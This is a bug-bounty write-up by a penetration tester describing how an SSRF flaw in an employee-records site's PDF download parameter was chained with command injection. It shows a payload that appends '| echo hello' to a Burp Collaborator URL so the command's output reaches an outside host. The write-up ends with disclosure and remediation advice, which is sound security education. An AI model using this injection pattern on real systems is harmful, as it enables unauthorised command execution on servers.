# The story of how I was able to chain SSRF with Command Injection Vulnerability

- **Source URL:** https://medium.com/@rajqureshi07/the-story-of-how-i-was-able-to-chain-ssrf-with-command-injection-vulnerability-ef31feb30ea9?source=rss------bug_bounty-5
- **Fetched from:** https://medium.com/feed/@rajqureshi07
- **Fetched:** 2026-11-16
- **Channel:** @dailybountywriteup
- **Telegram message:**  (id 1986)
- **Method:** medium-rss-content readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
Hello Everyone,

Hope you’re doing well, I am Raj Qureshi and I am a penetration tester. today I am doing another write-up about one of my best findings ever. In this write-up, I will be describing how I was able to chain SSRF attack with command injection Vulnerability.

So let’s start,

**What is SSRF?**

*SSRF or Server-Side Request Forgery is a vulnerability that allows an attacker to manipulate the requests sent by a web application to other servers. An attacker can exploit this vulnerability to make requests on behalf of the vulnerable server and access internal resources.*

**What is Command injection?**

*Command Injection is a vulnerability that allows an attacker to execute arbitrary commands on the server. An attacker can exploit this vulnerability by injecting malicious commands into an application that uses user input to construct command strings.*

I recently came across an employee record management site that stores the records of all employees and has a functionality to store all transactions done by the employees. Additionally, the site allows users to download the records in PDF format.

While testing the site, I noticed that when I downloaded the PDF, the site called a URL to the server with a parameter called “record”. The URL looked like this: [https://www.example.com/employeeRecord/?record=XYZ.pdf](https://www.example.com/employeeRecord/?record=XYZ.pdf).

I decided to use Burp Suite to capture this request and modify the value of the “record” parameter with Burp Collaborator.URL like this:[https://www.example.com/employeeRecord/?record=http://burpcolaboratorlink.com](https://www.example.com/employeeRecord/?record=http://burpcolaboratorlink.com) and I was able to see the response back in Burp Collaborator

Then, I thought of trying command injection by adding some Linux commands at the end of the URL like this: [https://www.example.com/employeeRecord/?record=http://burpcolaboratorlink.com](https://www.example.com/employeeRecord/?record=http://burpcolaboratorlink.com) | echo hello.

To my surprise, I was able to get the result of that command in Burp Collaborator. This is how I chain the SSRF to Command Injection vulnerabilities in the employee record management site.

I reported my findings to the site owners immediately and provided them with a detailed report of the vulnerabilities and their impact. They quickly patched the vulnerabilities and rewarded me for my responsible disclosure.

The solution to this vulnerability is to properly validate and sanitize all user input before using it in server-side requests. It’s also important to limit the privileges of the user executing the server-side code to minimize the impact of any potential vulnerabilities. Regular security audits can help identify and fix vulnerabilities before attackers can exploit them.

That’s it for this article, I hope you enjoy reading it!
